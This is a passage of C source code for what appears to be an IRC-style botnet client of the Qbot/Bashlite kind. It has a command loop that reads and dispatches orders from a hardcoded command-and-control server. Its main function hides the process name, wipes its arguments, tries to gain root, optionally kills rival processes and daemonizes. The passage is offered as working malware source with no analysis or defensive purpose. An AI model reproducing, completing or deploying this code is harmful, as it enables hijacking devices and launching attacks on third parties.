        UpdateNameSrvs(); //go code ur own shitty source ~l33t already handled this one
        char commBuf[4096];
        int got = 0;
        int i = 0;
        while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
            for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                    unsigned int *newpids, on;
                    for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                    pids[on - 1] = 0;
                    numpids--;
                    newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                    free(pids);
                    pids = newpids;
                }
            commBuf[got] = 0x00;
            trim(commBuf);
            if(strstr(commBuf, "ICMP") == commBuf) { // ICMP
                continue;
            }
            if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
            unsigned char *message = commBuf;
            if(*message == '!') { //X was here
                unsigned char *nickMask = message + 1;
                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                if(*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = message + 1;
                message = message + strlen(nickMask) + 2;
                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                unsigned char *command = message;
                while(*message != ' ' && *message != 0x00) message++;
                *message = 0x00;
                message++;
                unsigned char *tmpcommand = command;
                while(*tmpcommand) {
                    *tmpcommand = toupper(*tmpcommand);
                    tmpcommand++;
                }
                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(message, " ");
                params[0] = command;
                while(pch) {
                    if(*pch != '\n') {
                        params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }
                processCmd(paramsCount, params);
                if(paramsCount > 1) {
                    int q = 1;
                    for(q = 1; q < paramsCount; q++) {
                        free(params[q]);
                    }
                }
            }
        }
    }
}

int main(int argc, unsigned char *argv[]) {
    const char *lolsuckmekid = "daddyl33t's back";
    printf("[main] bot deployed\r\n");
    unsigned char server[512];
    sprintf(server, "%d.%d.%d.%d", IPA, IPB, IPC, IPD);
    printf("%s\r\n", server);
    #ifdef killer
    killer_boot();
    #endif
    if(argc > 1)
    {
        strncpy(bot_name, argv[1], 64);
    }
    else
    {
        strncpy(bot_name, "unknown", 64);
    }
    
    int x;
    for(x = 0; x < argc; x++)
    {
        strncpy(argv[x],"",strlen(argv[x]));
    }
    prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
    
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    
    LOCAL_ADDRESS = local_addr();
    
    chdir("/");
    
    setuid(0);
    seteuid(0);
    
    touchMyself(argv);
    
    signal(SIGPIPE, SIG_IGN);

    init_daemon_mgr();// inits daemon & starts main process

    return 0;
}
